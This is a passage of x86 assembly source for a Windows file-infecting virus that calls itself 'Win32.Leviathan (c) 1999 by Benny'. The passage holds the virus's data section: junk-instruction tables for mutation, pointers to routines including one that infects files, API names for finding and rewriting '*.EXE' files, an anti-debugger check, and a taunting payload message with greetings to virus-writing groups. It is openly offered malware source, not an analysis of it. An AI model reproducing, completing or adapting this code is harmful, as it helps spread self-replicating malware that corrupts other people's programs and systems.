tPoints:		irp Num, <1,2,3,4,5,6,7>
			dd		offset t&Num
			endm
tCount			=	($ - tPoints)/4
			dd		0

;junk address table
jPoints:		irp Num, <1,2,3,4,5,6,7,8,9>
			dd		offset j&Num
			endm
			dd		0

junx:			clc				;junk instructions
			cmc
			stc
			nop
			cld
			std
			lahf
			cwde
			cdq
			inc eax
			dec eax
			inc edx
			dec edx
num_of_junx	=	dword ptr $ - offset junx - 1

NumOfExecs		dd		?
GenerationCount		dd		?

StartOfNeurons:
			dd	offset Neuron_Debugger
			dd	offset Neuron_Find
			dd	offset Neuron_CheckFile
			dd	offset Neuron_OpenFile
			dd	offset Neuron_CloseFile
			dd	offset Neuron_InfectFile
			dd	offset Neuron_GetVersion
	num_of_neurons	=	7

szGetModuleHandleA	db		'GetModuleHandleA', 0
szGetModuleHandleW	db		'GetModuleHandleW', 0

szAPIs:
szCreateThread		db		'CreateThread', 0
szExitThread		db		'ExitThread', 0
szGetVersion		db		'GetVersion', 0
szFindFirstFileA	db		'FindFirstFileA', 0
szFindNextFileA		db		'FindNextFileA', 0
szFindClose		db		'FindClose', 0
szCreateFileA		db		'CreateFileA', 0
szCreateFileMappingA	db		'CreateFileMappingA', 0
szMapViewOfFile		db		'MapViewOfFile', 0
szUnmapViewOfFile	db		'UnmapViewOfFile', 0
szCloseHandle		db		'CloseHandle', 0
szSetFilePointer	db		'SetFilePointer', 0
szSetEndOfFile		db		'SetEndOfFile', 0
szSetFileTime		db		'SetFileTime', 0
szSetFileAttributesA	db		'SetFileAttributesA', 0
szGetCurrentProcess	db		'GetCurrentProcess', 0
szGetPriorityClass	db		'GetPriorityClass', 0
szSetPriorityClass	db		'SetPriorityClass', 0
szLoadLibraryA		db		'LoadLibraryA', 0
szFreeLibrary		db		'FreeLibrary', 0
			db		0ffh
szIsDebuggerPresent	db		'IsDebuggerPresent', 0
szMessageBoxA		db		'MessageBoxA', 0


szExt			db		'*.EXE', 0
			org $ - 1
JumpToHost		db		?


szMsgTitle		db		'Win32.Leviathan (c) 1999 by Benny', 0
szMsgText		db		'Hey stupid !', 0dh, 0dh
			db		'This is gonna be your nightmare...', 0dh
			db		'30th generation of Leviathan is here... beware of me !', 0dh
			db		'Threads are stripped, ship is sinkin''...', 0dh, 0dh
			db		'Greetz:'
			db		09, 'Darkman/29A', 0dh
			db		09, 'Super/29A', 0dh
			db		09, 'Billy Belcebu/DDT', 0dh
			db		09, 'and all other 29Aers...', 0dh, 0dh
			db		'Special greet:', 0dh
			db		09, 'Arthur Rimbaud', 0dh, 0dh
			db		'New milenium is knockin on the door... ', 0dh
			db		'New generation of viruses is here, nothing promised, no regret.', 0

virus_end:
_GetModuleHandleA	dd		offset GetModuleHandleA
_GetModuleHandleW	dd		offset GetModuleHandleW

ddAPIs:
ddCreateThread		dd		?
ddExitThread		dd		?
ddGetVersion		dd		?
ddFindFirstFileA	dd		?
ddFindNextFileA		dd		?
ddFindClose		dd		?
ddCreateFileA		dd		?
ddCreateFileMappingA	dd		?
ddMapViewOfFile		dd		?
ddUnmapViewOfFile	dd		?
ddCloseHandle		dd		?
ddSetFilePointer	dd		?
ddSetEndOfFile		dd		?
ddSetFileTime		dd		?
ddSetFileAttributesA	dd		?
ddGetCurrentProcess	dd		?
ddGetPriorityClass	dd		?
ddSetPriorityClass	dd		?
ddLoadLibraryA		dd		?
ddFreeLibrary		dd		?

ddThreadID		dd		?

NHandles:
hNeuron_Debugger	dd		?
hNeuron_Find		dd		?
hNeuron_CheckFile	dd		?
hNeuron_OpenFile	dd		?
hNeuron_CloseFile	dd		?
hNeuron_InfectFile	dd		?
hNeuron_GetVersion	dd		?

hFile			dd		?
hMapFile		dd		?
lpFile			dd		?

K32Handle		dd		?
SearchHandle		dd		?
WFD		WIN32_FIND_DATA		?
buffer			db		virus_end - Start dup (?)
virtual_end:

ends
End Start

